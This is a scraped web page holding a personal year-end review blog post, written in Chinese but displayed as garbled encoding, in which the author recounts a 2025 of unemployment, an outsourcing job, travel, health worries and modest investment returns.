li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>ã€Œ2025ã€ å¹´å°±è¿™ä¹ˆç¨€é‡Œç³Šæ¶‚çš„è¿‡å»å’¯, å‰ä¸ä¹…æ­£å·§å¬åˆ°è¿™æœŸæ’­å®¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.xiaoyuzhoufm.com%2Fepisode%2F694cb71148b2027f30894e07" target="_blank" title="https://www.xiaoyuzhoufm.com/episode/694cb71148b2027f30894e07" ref="nofollow noopener noreferrer">ã€Šè¯·æ”¶ä¸‹è¿™æšè®°å½• 2025 å¹´çš„å£°éŸ³æ—¶å…‰èƒ¶å›Šã€‹</a> ä¸ç¦æ„Ÿæ…¨, äºä¸–ç•Œè€Œè¨€ã€Œ2025ã€è¿™ä¸€å¹´å±å®ç²¾å½©:</p>
<ul>
<li>å¹´åˆçš„ <code>Deepseek</code>ã€å®‡æ ‘æœºå™¨äººçˆ†ç«</li>
<li>ç‰¹æœ—æ™®ä¸Šå°åå„ç§æŠ˜è…¾, å…³ç¨æˆ˜ä¸€åº¦å¼•èµ·å…¨çƒè‚¡å¸‚æš´è·Œ, è€Œæœ€ååˆå¥½åƒå•¥ä¹Ÿæ²¡å‘ç”Ÿä¸€æ ·</li>
<li>åé¢æ³¡æ³¡é©¬ç‰¹çˆ†ç«ã€å°çº¢ä¹¦å‡ºåœˆ...</li>
<li>ä¹‹ååˆæœ‰é›·å†›å¡Œæˆ¿ã€è¥¿è´å¡Œæˆ¿ã€ä¿æ•æ´ªå¡Œæˆ¿...</li>
<li>å†ä¹‹ååˆæ˜¯ç¾å›¢ã€äº¬ä¸œã€æ·˜å®ä¸‰æ–¹å¤–å–å¤§æˆ˜...</li>
<li>æœ€åé«˜å¾·é—­å…³æ•´äº†ä¸ªç”¨è„šæŠ•ç¥¨, æœ€åå¥½åƒä¹Ÿæ²¡å£°äº†</li>
<li>ç„¶åå°±æ˜¯å„å¤§å‚å•†çš„ <code>AI</code> äº‰å¤ºæˆ˜äº†</li>
<li>...</li>
</ul>
<p>ç„¶è€Œè¿™ä¸€åˆ‡åˆå’Œæˆ‘æœ‰å•¥å…³ç³», å„ç§é£å£å¹¶æ²¡æœ‰è®©æˆ‘è¸©åˆ°, <code>AI</code> çš„å‡ºç°ä¹Ÿåªä¼šè®©æˆ‘æ›´éš¾æ‰¾åˆ°åˆé€‚çš„å·¥ä½œ, <code>2025</code> æˆ‘ä¾ç„¶è¿‡å¾—å¹³åº¸, æ¯”èµ· <code>2024</code> ä¹Ÿæ²¡å•¥èµ·è‰²....</p>
<p>è€Œ <code>2026</code>, æˆ‘çš„ç”Ÿæ´»å¤§æ¦‚ç‡è¿˜æ˜¯ä¸ä¼šæœ‰èµ·è‰²? è°çŸ¥é“å‘¢? éšä¾¿å§....</p>
<h2 data-id="heading-1">ä¸€ã€æ— ä¸šæ¸¸æ°‘è¿™åŠå¹´</h2>
<p>ä»å»å¹´ä¹æœˆä»½è¢«è£åå°±ä¸€ç›´åœ¨ <code>GAP</code>, å±å®æ²¡æƒ³åˆ°è¿™ä¸€ <code>GAP</code> å°± <code>GAP</code> äº†è¿‘ä¸€å¹´....</p>
<p>ä¸å¹¸çš„ <code>2024</code> åˆæ˜¯å¤±ä¸šåˆæ˜¯è½¦ç¥¸, æ‰€ä»¥å¹´åˆä¸€ç›´åœ¨å¤„ç†å·¥ä¼¤çš„äº‹; ä»åŠ³åŠ¨èƒ½åŠ›é‰´å®šã€å‡ºåŠ³åŠ¨èƒ½åŠ›é‰´å®šç»“æœã€æäº¤å·¥ä¼¤èµ”å¿ç”³è¯·åˆ°æœ€å ğŸ’° åˆ°è´¦ã€‚æŠ˜è…¾äº†ä¸‰å››ä¸ªæœˆ, è·‘äº†å¥½å‡ æ¬¡ç¤¾ä¿å±€, æ¡é’±å¥½åƒä¹Ÿæ²¡é‚£ä¹ˆå®¹æ˜“</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d711f3b617a4ec4bd3386594d367a1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=qXSy1aEShnf5M9KGAh3LAvaabtQ%3D" alt="image" loading="lazy"/></p>
<p>å½“ç„¶æœ€åç»“æœæ˜¯å¥½çš„, å°èµšäº†ä¸€ç¬”ã€‚ é’±åˆ°è´¦å‰è¿˜è®¡åˆ’ç€å‡ºå»å¥¢ä¾ˆä¸€æŠŠ, åˆ°è´¦åè¿˜æ˜¯ä¸èˆå¾—èŠ±é’±, è¿˜æ˜¯è€è€å®å®å­˜ç€å§....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcd27040e31e46638beb58797ac094b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=yIvdZjHUVELfDgGFg7Z7tLefC%2BY%3D" alt="image" loading="lazy"/></p>
<p>ä¸ŠåŠå¹´é™¤äº†æŠ˜è…¾å·¥ä¼¤è¿™äº‹, å…¶ä½™æ—¶é—´å°±æ˜¯å‡†å¤‡é¢è¯•å’¯, è¿™æœŸé—´è¿˜å°è¯•å†™æ—¥è®°ã€åš <code>TODO</code>...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3dd8fdcc6e424c3cb0ac3f854693dd50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=gZW8Jr%2FaH81y%2FqdWqGD1OdWBI%2Fo%3D" alt="image" loading="lazy"/></p>
<p>ç„¶é¹…å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨, å›å¤´è¿‡äº†ä¸‹ä¸ŠåŠå¹´å†™çš„å†…å®¹, æ¯å¤©å†™çš„æœ€å¤šçš„å°±æ˜¯:</p>
<ul>
<li>å»å¥èº«æˆ¿</li>
<li>ç…®é¥­</li>
<li>æ²¡æœ‰é¢è¯•æœºä¼š</li>
<li>ç„¦è™‘</li>
<li>ä»Šå¤©åˆå•¥éƒ½æ²¡å¹²</li>
<li>....</li>
</ul>
<p>æ˜¯çš„å¤±ä¸šè¿™åŠå¹´åŸºæœ¬ä¸Šä¹Ÿæ²¡å¹²å•¥, æœ‰é¢è¯•æœºä¼šå°±é¢è¯•, æ²¡æœ‰å°±å®…å®¶é‡Œå’Œ â€œè‡ªå¾‹â€ æŠ—äº‰...</p>
<p>æœ€åè‡ªç„¶ä¹Ÿä¸ä¼šæœ‰å‡ºä¹æ„æ–™çš„ç»“æœ, ç ´ç½å­ç ´æ‘”ç½¢äº†ã€‚æœ€åå…¥èŒäº†ä¸€å®¶å¤–åŒ…å…¬å¸, ä¸»è¦æ˜¯çœ‹ç»™çš„è–ªèµ„ä¹Ÿè¿˜è¡Œå°±å»äº†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb17ad9ba791431d9d05dea3cd168dbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=WyooqhAYz5P%2FU2UzPw9PXdTESLk%3D" alt="image" loading="lazy"/></p>
<h2 data-id="heading-2">äºŒã€ å¤–åŒ…è¿™åŠå¹´</h2>
<p>äººç”Ÿç¬¬ä¸€æ¬¡å¤–åŒ…å·¥ä½œ, å¥½åƒä¹Ÿæ²¡æƒ³è±¡ğŸ¤”ä¸­é‚£ä¹ˆå·®</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2919bb1adb004f88b698a9abb941f3bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=5e0Lq5RAWcs1wsmvOdW2HAOqpPs%3D" alt="image" loading="lazy"/></p>
<p>æœ‰å…è´¹çš„é›¶é£Ÿåƒã€æ— é™è‡ªåŠ©å’–å•¡, å¶å°”ä¸€å¤©å¹²å®ƒä¸ªä¸‰æ¯ ğŸ˜‚)ã€‚è¿‡èŠ‚ä¹Ÿæœ‰å„ç§ç¤¼ç›’ã€å»äº†åŠå¹´ T æ¤ã€è¡£æœã€å¸½å­ã€é¼ æ ‡å«éƒ½ä¸çŸ¥é“é¢†äº†å¤šå°‘ä¸ªäº†, åŒæ—¶å¤–åŒ…å…¬å¸è¿‡èŠ‚å¶å°”ä¹Ÿæœ‰ç¤¼ç›’, è¿™è¿‡ä¸€æ¬¡èŠ‚é¢†åŒä»½ç¤¼ç›’äº†éƒ½ ğŸ‘</p>
<p>å¯¹äº†, è¿˜æœ‰å…è´¹çš„æ—©ä¸­æ™šé¤ã€‚åˆšå¼€å§‹å»è¿˜è‡ªå·±å¸¦é¥­, åé¢æ­å·è¿™è¾¹å¯ä»¥é›†ä½“ç‚¹é¤äº†, è‡ªæ­¤ä¸‰é¤å°±å…¨åŒ…å’¯ã€‚æ™šé¤ä¸åƒ, å°±å¸¦å›å»ç»™å¯¹è±¡, ç¬¬äºŒå¤©å¥¹å¸¦å»å…¬å¸å½“åˆé¥­åƒ, ä¸€å®¶äººå…¨é å…¬å¸å…»æ´»äº†</p>
<p>å”¯ä¸€ä¸å¥½çš„å°±æ˜¯å¾—åŠ ç­, æ¯å¤©å¾— <code>8.30</code> ä¸‹ç­, è¿™æ ·å°±æ›´ä¸æƒ³å»å¥èº«äº†ã€‚ä¸‹ç­åˆ°å®¶éƒ½ <code>9</code> ç‚¹äº†, å¦‚æœå»å¥èº«é‚£ä¹ˆåˆ°å®¶éƒ½å¾— <code>10</code> ç‚¹å¤šäº†ã€‚ä¸å¯¹, è¿˜æœ‰å°±æ˜¯æ²¡æœ‰å¹´å‡, è¿™å‘çˆ¹çš„å¤–åŒ…å…¬å¸å¿…é¡»å…¥èŒæ»¡ä¸€å¹´æ‰ç»™å¹´å‡....</p>
<p>æ²¡æœ‰ç»©æ•ˆå‹åŠ›, çº¯ç‰›é©¬å¥½åƒè¿‡å¾—ä¹ŸæŒºçˆ½çš„, è¿æ°”å¥½çš„æ˜¯è¿˜æœ‰æœºä¼šæ¥è§¦åˆ° <code>Agent</code> ç›¸å…³çš„å·¥ä½œ(è™½ç„¶åªæ˜¯è¾¹ç¼˜çš„å¯¹æ¥å·¥ä½œ)</p>
<h2 data-id="heading-3">äºŒã€å¥½å¥½ç”Ÿæ´»</h2>
<h3 data-id="heading-4">2.1 è§å®¶é•¿</h3>
<p>äººç”Ÿè¿›ç¨‹ <code>+1</code>: <code>51</code> å»äº†å¯¹è±¡è€å®¶, <code>10</code> æœˆä»½è¶ç€å‘¨æœ«å¸¦å¯¹è±¡ä¹Ÿå›äº†è¶Ÿæˆ‘çš„è€å®¶, ä¸€åˆ‡éƒ½è¿˜æŒºé¡ºåˆ©çš„ã€‚å®é™…ä¸Šå¥½åƒä¹Ÿæ²¡æƒ³è±¡ä¸­é‚£ä¹ˆç´§å¼ , åœ¨å¯¹è±¡è€å®¶è¿™ä¸€å¾…å°±å¾…äº† <code>5</code> å¤©, æ¯å¤©å°±æ˜¯åƒåƒå–å–...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/803dc192687a49e988992e3e67f803f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=bzE9DC7wQQc9sXmcQqYb3ZUMPz8%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-5">2.2 æ—…æ¸¸</h3>
<p>ä¸ŠåŠå¹´ä¸€ç›´å¿™ç€å·¥ä¼¤å’Œå·¥ä½œçš„äº‹, ä¸‹åŠå¹´ä¹Ÿä¸€ç›´åœ¨ä¸Šç­, æ‰€ä»¥è¿™ä¸€å¹´ä¹Ÿæ²¡å»å‡ ä¸ªåœ°æ–¹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/627549749cb843a9a8e12ee4e4585021~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=a3LLvcB6Tr5qv6na6zgkdESet8w%3D" alt="image" loading="lazy"/></p>
<p>äº”æœˆä»½å¤§å­¦èˆé•¿ç»“å©š, å°±å’Œå¯¹è±¡ä¸€èµ·å»äº†è¶Ÿç¦å»º, ä¹‹åå°±é¡ºä¾¿å°±ç»•é“å»å¦é—¨ç©äº†å‡ å¤©ã€‚å¦é—¨ä¸é”™, å°±æ˜¯ç‰©ä»·å¿’è´µäº†, å¦‚æœå»é¼“æµªå±¿åƒä¸‡è‡ªå¸¦åƒé£Ÿ, è¦ä¸ç„¶å°±ç­‰ç€è¢«å®°å§ã€‚ä½çš„é…’åº—å°±æŒºä¸é”™çš„, æœåŠ¡å‘¨åˆ°ã€è¿˜æœ‰ä¸ªå¤§å¤©å°...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/626e075b4df24786a3df12346aad2406~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=HEydnKwtN6Jd6qkFlCNHg%2FExt1c%3D" alt="image" loading="lazy"/></p>
<p>ä¹‹åå°±æ˜¯åæœˆä»½, å»äº†å¿ƒå¿ƒå¿µå¿µçš„é‡åº†ã€‚ä¸æ„§æ˜¯å±±åŸå•Š, æœ‰è¢«æƒŠåˆ°, åˆšå»å°±æŒ‰é”™ç”µæ¢¯äº† ğŸ¶ã€‚å’Œç¾é£Ÿè’æ¼ çš„æ­å·ç›¸æ¯”, é‚£é‡åº†ç®€ç›´æ˜¯ç¾é£Ÿå¤©å ‚äº†å§ã€‚å¯æƒœäº†, ä¸Šäº†å¹´çºªäº†çœŸçœŸæ„Ÿè§‰æ²¡ä»¥å‰èƒ½åƒäº†, ä¸€åƒå¤šè‚šå­å°±éš¾å—å¾—å¾ˆ....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c564516eaff249658cff3779509ace74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=QwyqmcmfkzrfAfcIeGntM0Gkqzk%3D" alt="image" loading="lazy"/></p>
<p>å†ä¹‹ååˆå»äº†è¶Ÿæ¡åº, å½“ç„¶ä¸»è¦ç›®çš„æ˜¯å¯¹è±¡åœ¨æ”¯ä»˜å®ä¸Šç™½å«–äº†åŒ»ç¾é¡¹ç›®(åªæœ‰é‚£è¾¹èƒ½é¢„çº¦åˆ°), é¡ºå¸¦ç€å°±æƒ³ç€æºœè¾¾æºœè¾¾ã€‚æ™¯ç‚¹å°±å»äº†ã€ŒçŸ³èˆæ‘ã€, ä¸»è¦æ˜¯æ·¡å­£å¾ˆå¤šæ™¯ç‚¹éƒ½é—­å›­ä¿®æ•´äº†, åœ¨å¯Œæ˜¥æ±Ÿæºœè¾¾äº†ä¸¤å¤©å°±æºœäº†, æ±Ÿè¾¹ä¸€è·¯é£æ™¯å€’æ˜¯æŒºä¸é”™çš„ã€‚</p>
<h3 data-id="heading-6">2.3 å¥åº·</h3>
<p>æ˜¯ä¸æ˜¯äººä¸€åˆ° <code>30</code> å¾€å, èº«ä½“æ¯›ç—…å°±å¼€å§‹å¤šèµ·æ¥äº†ã€‚ ä¸ŠåŠå¹´å·®ç‚¹ä¸èƒ½å…¥èŒäº†, ä¸»è¦å°±æ˜¯ä½“æ£€ã€Œå¿ƒç”µå›¾ã€æœ‰ç‚¹å¼‚å¸¸, å“åäº†éƒ½ã€‚åé¢ç¬¬äºŒå¤©åˆè·‘åŒ»é™¢é‡æ–°åšäº†ä¸€æ¬¡, è¿˜æ˜¯æœ‰ä¸€ç‚¹ç‚¹ã€Œå¼‚å¸¸ã€åˆè¡¥äº†å…¶ä»–æ£€æŸ¥, æœ€åæ²¡å‘ç°é—®é¢˜, è®©åŒ»ç”Ÿå¼€äº†ä¸ªè¯æ˜, æ‰é¡ºåˆ©å…¥èŒã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b51c1314cd774cca8f8270b7671d1338~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=q8bAWtnEOzzR8v9wcT60%2FVcNAsc%3D" alt="image" loading="lazy"/></p>
<p>å¯èƒ½æ˜¯é‚£å‡ å¤©ç”Ÿæ´»ä½œæ¯ä¸è‰¯å¼•èµ·çš„ã€Œå¿ƒç”µå›¾ã€æ³¢åŠ¨, ä½†æ˜¯é‚£æ—¶æ‰æ„Ÿè§‰çœŸçš„è€å’¯, ä»¥å‰å¯ä¸è¿™æ ·ã€‚å¹¶ä¸”è¿˜æ£€æŸ¥å‡ºè¡€å‹åé«˜, å½“ç„¶æˆ‘è¡€å‹åé«˜è¿™äº‹å…¶å®æ—©å°±çŸ¥é“, åªæ˜¯ä¸€ç›´ä¸é‡è§†è€Œå·²ã€‚è¿™æ¬¡æ£€æŸ¥åŒ»ç”Ÿè¯´æˆ‘çš„ä¸€ä¸ªå¿ƒæˆ¿å¥½åƒåå¤§, é—®æ˜¯ä¸æ˜¯è¡€å‹é«˜, æˆ‘è¯´æ˜¯çš„, ç„¶åå°±å»ºè®®æˆ‘åƒè¯ã€å‡è‚¥...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6907efff61a49e2a3e28e43c7ad7243~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=aHmEuvTfokDrpZLoZ09YqxLh04I%3D" alt="image" loading="lazy"/></p>
<p>å¥½å’¯, è°¨éµåŒ»å˜±ã€‚ ç°åœ¨å°±æ˜¯æ¯å¤©é£Ÿç”¨é™å‹è¯, è¿˜ç»™è‡ªå·±å®‰æ’ä¸Šäº†è¡€å‹ä»ªã€‚</p>
<p>åé¢å°±å¼€å§‹å°è¯•å‡è‚¥äº†, åˆ°ç›®å‰ä¸ºæ­¢å·²ç˜¦ <code>20</code> æ–¤å§ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯å‰é¢å‡ ä¸ªæœˆå‡ä¸‹æ¥çš„, ä¸»è¦æœ€å¼€å§‹ä¸Šç­éƒ½æ˜¯è‡ªå·±å¸¦é¥­, åšçš„ä¹Ÿå¹²å‡€(åŸºæœ¬æ°´ç…®), æ‰€ä»¥ç˜¦å¾—è¿˜æŒºå¿«çš„ã€‚</p>
<p>åé¢å…¬å¸æœ‰å…è´¹çš„æ—©ä¸­æ™šé¤, å°±æ”¾å¼ƒè‡ªå·±å¸¦é¥­å’¯ã€‚ æ…¢æ…¢çš„å°±åå¼¹äº†ç‚¹, äººå•Šä¸€ç ´é˜²å°±å®¹æ˜“ç ´ç½å­ç ´æ‘”, ç°åœ¨ä¹Ÿä¸å…³æ³¨ä½“é‡äº†, ç°åœ¨ä¼°è®¡åˆåå¼¹ä¸å°‘....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e287bad1ca441268bf9a654e0215fa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=ATZ%2FrRP6MdwbpT%2FQAQlGNSmVc24%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-7">2.4 ç†è´¢</h3>
<p>ä»Šå¹´å¤§å®¶éƒ½å›æœ¬äº†å§ ğŸ¶ã€‚ æ¯•ç«Ÿä»Šå¹´å¤§ A è¡¨ç°è¿™ä¹ˆå¥½, å†ä¸å›æœ¬ä¹Ÿå¤ªè¯´ä¸è¿‡å»äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97763142a71b46829ca2561d8e0b45cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=dE62X26akT9HOWU2y4cEnDFCEg4%3D" alt="image" loading="lazy"/></p>
<p>ä»Šå¹´æˆ‘ä¹Ÿå¯ç®—å›æœ¬äº†, æ„Ÿè°¢å¤§ A ğŸ™‡ã€‚å¾€å¹´æˆ‘çš„ç†è´¢è´¦æˆ·æ˜¯å¦ä¸€ä¸ªæ”¯ä»˜å®, åªä¸ºäº†çœ¼ä¸è§ä¸ºå‡€æ¯•ç«Ÿäºäº†é‚£ä¹ˆå¤šã€‚ä»Šå¹´åšäº†ä¸ªæ”¹å˜:</p>
<ul>
<li>å°†æ‰€æœ‰åŸºé‡‘éƒ½è½¬æ‰˜ç®¡åˆ°å¸¸ç”¨çš„é‚£ä¸ªæ”¯ä»˜å®ä¸Š</li>
<li>è¿½æ±‚ç¨³å¥ã€åˆ†æ•£, å¹¶å–æ‰äºæŸå¤§çš„</li>
<li>å¤§ä»“ä½æ”¾åœ¨å€ºåŠµã€å›ºæ”¶ã€çº¢åˆ©ä¸Š</li>
<li>è¿˜é…ç½®äº†ç‚¹çº³æŒ‡</li>
<li>æœ€ååªæœ‰ä¸€å°éƒ¨åˆ†æ”¾åœ¨ç§‘æŠ€ä¸Š</li>
</ul>
<p>è¿™ç§åšæ³•æ˜¯ç¨³, ä½†æ³¨å®šä¸èƒ½èµšå¤ªå¤šã€‚åœ¨ä»Šå¹´è¡Œæƒ…è¿™ä¹ˆå¥½çš„æƒ…å†µä¸‹, ä»Šå¹´æ”¶ç›Šä¹Ÿå°± <code>8.25%</code> è¿œè¿œè·‘è¾“å¤§ç›˜ã€‚æ…¢æ…¢æ¥å§, èµ·ç ä»Šå¹´çš„æ”¶ç›Šå¯ä»¥æŠŠæˆ‘ä¸€å¹´çš„æˆ¿ç§Ÿç»™ <code>cover</code> æ‰, è¿˜æ˜¯æŒºæ»¡æ„çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e0b938ff5094cf391cd6cb46a783e4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=xd1H%2BVfSaWJWyeCsfgMh4Myzg5w%3D" alt="image" loading="lazy"/></p>
<p>ä»Šå¹´åŠåœºè¿˜è¿›äº†è‚¡å¸‚, æŠ˜è…¾äº†å¤§åŠå¹´, å°èµš <code>400</code> å¤§æ´‹ ğŸ˜†ã€‚å°èµ„é‡‘, ç©å¾—ä¸äº¦è¯´ä¹....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3a27a3aab634d73b7c6178b800abec2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=0ZJnv015m%2B8kOtgJ6UlQPGTTxIg%3D" alt="image" loading="lazy"/></p>
<p>ä»Šå¹´é»„é‡‘ã€ç™½é“¶ä¹Ÿæœ‰ç‚¹ç»™åŠ›ã€‚é»„é‡‘å…¥åœºäº†, å¯æƒœä¸­åœºæ²¡æ‹¿ä½å–äº†, åé¢åˆè¿›åœº, å°‘èµšäº†(è™½ç„¶ä¹Ÿæ²¡ä¹°å¤šå°‘)ã€‚åé¢ç™½é“¶å‡ºç°å¥—åˆ©çš„æœºä¼š, æ²¡æ•´æ˜ç™½å°±çç‚’ä½œ, å¯¼è‡´è€½è¯¯äº†å¥½å‡ å¤©, å°‘å¥—åˆ©äº†ä¸å°‘ã€‚æˆ‘å¯¹è±¡åœºå¤–ä¹°äº†ä¸å°‘, ä¹Ÿå› æ­¤é”™è¿‡äº†æœ€é«˜ç‚¹(å°±å·®é‚£ä¹ˆä¸€å¤©), å¯æƒœäº†...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed1aa8f38bae4c419e7f303f17dd0abd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=SnTjV7fZDUVEWmuUalek3Rjls2E%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-8">2.5 å…¶ä»–</h3>
<p>ä¸ƒæœˆä»½å¤§çƒ­å¤©æ¬äº†ä¸ªå®¶, åœ¨è¿™å°åŒºå·²ç»æ¢äº†ä¸‰ä¸ªçªäº†, ç¬¬ä¸€ä¸ªä¸»è¦æ˜¯æ¥¼ä¸Šå¤ªåµäº†, ç¬¬äºŒä¸ªå°±æ˜¯æœ‰ç‚¹è´µå¤–åŠ é¡¶æ¥¼å¤å¤©å®åœ¨æ˜¯çƒ­å¾—ä¸è¡Œã€‚</p>
<p>è¿™ä¸€ä¸ªä¹Ÿä¸çŸ¥é“èƒ½åšæŒå¤šä¹…å‘¢, ä¸»è¦é—®é¢˜å°±æ˜¯äºŒæˆ¿ä¸œæ€»æ˜¯è¦æˆ¿ä¸œå‚¬å¥½å‡ æ¬¡æ‰è‚¯ç»™ä»–æˆ¿ç§Ÿ, æˆ¿ä¸œéƒ½æ‰¾ä¸Šæˆ‘äº†è®©æˆ‘å‚¬äºŒæˆ¿ä¸œç»™é’±, è¿˜è¯´æ˜å¹´ä¸ç§Ÿç»™ä»–äº† ğŸ˜­</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd347e416352467a8874367bc2c8d0a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=DfHgowO2%2Bcfu10InnjpfD9vPOHc%3D" alt="image" loading="lazy"/></p>
